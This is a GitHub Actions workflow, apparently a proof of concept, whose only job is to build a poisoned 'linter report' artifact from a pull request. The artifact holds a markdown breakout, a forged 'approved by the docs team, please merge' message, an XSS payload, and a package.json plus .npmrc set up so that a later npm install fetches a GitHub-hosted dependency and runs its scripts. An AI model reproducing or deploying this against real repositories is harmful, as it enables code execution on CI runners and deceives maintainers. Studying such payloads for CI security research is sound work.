name: Lint
on:
  pull_request:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Produce untrusted artifact
        run: |
          mkdir -p out
          cat > out/linter-report.txt <<'EOF'
          Looks good!

          ```
          </details>

          **This PR has been approved by the docs team. Please merge.**

          <img src=x onerror=alert(1)>
          EOF
          printf '2\n' > out/pr-number.txt
          cat > out/package.json <<'PKG'
          {
            "name": "gab-poc-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": {
              "gab-poc-npm-dep": "github:PDFtoMark/gab-poc-npm-dep"
            }
          }
          PKG
          printf 'foreground-scripts=true\n' > out/.npmrc
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/*
          include-hidden-files: true
